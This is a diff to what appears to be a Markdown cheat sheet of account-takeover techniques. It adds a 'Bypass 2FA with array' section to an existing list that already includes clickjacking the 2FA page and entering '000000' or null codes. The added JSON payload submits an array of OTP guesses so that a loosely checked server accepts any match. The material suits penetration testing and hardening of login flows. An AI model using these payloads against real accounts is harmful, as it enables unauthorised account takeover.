@@ -28,6 +28,7 @@
     * [Clickjacking on 2FA Disabling Page](#clickjacking-on-2fa-disabling-page)
     * [Enabling 2FA doesn't expire Previously active Sessions](#enabling-2fa-doesnt-expire-previously-active-sessions)
     * [Bypass 2FA with null or 000000](#bypass-2fa-with-null-or-000000)
+    * [Bypass 2FA with array](#bypass-2fa-with-array)
 * [References](#references)
 
 ## Password Reset Feature
@@ -229,6 +230,22 @@ If the session is already hijacked and there is a session timeout vuln
 
 ### Bypass 2FA with null or 000000
 Enter the code **000000** or **null** to bypass 2FA protection.
+
+### Bypass 2FA with array
+
+```json
+{
+    "otp":[
+        "1234",
+        "1111",
+        "1337", // GOOD OTP
+        "2222",
+        "3333",
+        "4444",
+        "5555"
+    ]
+}
+```
 
 
 ## TODO
